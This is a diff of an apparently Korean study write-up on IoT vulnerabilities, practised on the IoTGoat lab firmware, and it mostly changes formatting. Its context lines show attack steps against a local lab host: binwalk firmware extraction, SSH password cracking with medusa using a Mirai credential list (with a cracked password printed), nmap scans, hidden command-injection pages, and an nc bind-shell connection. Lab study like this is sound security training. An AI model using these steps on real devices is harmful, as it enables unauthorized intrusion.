@@ -28,7 +28,6 @@ BOB에서 진행한 프로젝트 중 이와 관련하여 좀 더 광범위하게
 - 평소 관심있는 분야이기에 졸업프로젝트에서는 개발에 초점을 뒀다면, 이번 미션을 통해서는 Connected System 과 관련한 취약점에 초점을 두고 공부하고, 기회가 된다면 실습도 진행하면서 IoT 보안과 관련한 좀 더 심도 깊은 이해를 할 수 있는 기회라고 생각했기 때문에 해당 주제를 선정하게 되었다.
 
 <br>
-<br>
 
 
 ### Connected System 취약점
@@ -162,10 +161,7 @@ BOB에서 진행한 프로젝트 중 이와 관련하여 좀 더 광범위하게
 
 <br>
 
-### Connected System 취약점 실습하기
-<br>
-
-[실습 참고자료](https://jookting.tistory.com/105)
+### Connected System 취약점 실습하기 : [실습 참고자료](https://jookting.tistory.com/105)
 
 <br>
 
@@ -183,9 +179,9 @@ IoT 취약점 실습용 환경인 IoTGoat를 사용해 펌웨어 분석 → 인�
 <br>
 <br>
 
-1. 펌웨어 내 하드코딩 되어있는 사용자 인증정보 획득하기
+**펌웨어 내 하드코딩 되어있는 사용자 인증정보 획득하기**
 
-**binwalk를 이용하여 IoTGoat 파일 시스템 추출**
+**-binwalk를 이용하여 IoTGoat 파일 시스템 추출**
 
 <br>
 
@@ -282,9 +278,11 @@ Updating files: 100% (5336/5336), done.
 ```
 
 <br>
-- 제공되는 mirai-botnet.txt 파일 내에 (사용자,패스워드) 쌍으로 저장되어 있으므로 패스워드만 남겨 파일을 재생성 함
-<br>
 
+- 제공되는 mirai-botnet.txt 파일 내에 (사용자,패스워드) 쌍으로 저장되어 있으므로 패스워드만 남겨 파일을 재생성 함
+- 
+<br>
+<br>
 
 ```
 $ ls
@@ -295,6 +293,7 @@ $ awk '{print $2}' mirai-botnet.txt > mirai-botnet_passwords.txt
 ```
 
 <br>
+
 - medusa를 이용하여 패스워드 크랙 시도
 
 - 대상: 실행중인 IoTGoat-x86의 ip
@@ -359,10 +358,12 @@ ACCOUNT FOUND: [ssh] Host: 192.168.64.133 User: iotgoatuser Password: 7ujMko0viz
 
 <br>
 
-2. nmap 스캔을 통한 서비스 정보 획득
+
+**nmap 스캔을 통한 서비스 정보 획득**
+
 <br>
 
-**전체 포트 스캔하여 오픈된 서비스 확인**
+**- 전체 포트 스캔하여 오픈된 서비스 확인**
 
 <br>
 
@@ -387,7 +388,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2801.44 seconds
 
 <br>
 
-**upnp 서비스 버전정보스캔**
+**upnp 서비스 버전 정보 스캔**
 <br>
 
 - MiniUPnP 2.1
@@ -450,7 +451,7 @@ Nmap done: 1 IP address (1 host up) scanned in 21.56 seconds
 
 - Webserver: OpenWRT/18.06.2 UPnP/1.1 MiniUPnPd/2.1
 
-[참고 자료](nmap.org/nsedoc/scripts/broadcast-upnp-info.html)
+- 참고자료 : [참고 자료](nmap.org/nsedoc/scripts/broadcast-upnp-info.html)
 
 <br>
 
@@ -574,12 +575,11 @@ Nmap done: 1 IP address (1 host up) scanned in 66.40 seconds
 ```
 <br>
 
-
-3. 숨겨진 페이지 찾기
+**숨겨진 페이지 찾기**
 
 <br>
 
-**binwalk를 이용하여 IoTGoat 파일 시스템 추출**
+**-binwalk를 이용하여 IoTGoat 파일 시스템 추출**
 
 
 ```
@@ -603,7 +603,8 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
 ```
 <br>
-추출 후 생성된 폴더에서 controller 디렉토리 내 iotgoat.lua 파일 확인
+
+**추출 후 생성된 폴더에서 controller 디렉토리 내 iotgoat.lua 파일 확인**
 
 - admin/iotgoat/cmdinject, admin/iotgoat/cam, admin/iotgoat/door, admin/iotgoat/webcmd 설정 확인
 
@@ -661,11 +662,16 @@ end
 <img width="886" height="187" alt="Image" src="https://github.com/user-attachments/assets/9ec0089f-2676-4244-af00-1b7186d992cc" />
 <br>
 
+<br>
+
 **webshell을 이용하여 쉘 획득 시도**
 <br>
+<br>
+
 - '2-1에서 nmap을 통해 포트가 열려있는 서비스를 확인하였음
 
 <br>
+
 ```
 PORT      STATE SERVICE
 22/tcp    open  ssh
@@ -677,9 +683,11 @@ PORT      STATE SERVICE
 65534/tcp open  unknown
 
 ```
+
 <br>
 - 서비스가 unknown으로 확인되는 5515 포트를 이용하여 바인드쉘 획득
 <br>
+
 
 ```
 $ nc -nv 192.168.64.133 5515                                                                                                                         1 ⨯
@@ -703,8 +711,8 @@ tmp
 usr
 var
 www
-
 ```
+
 <br>
 
 
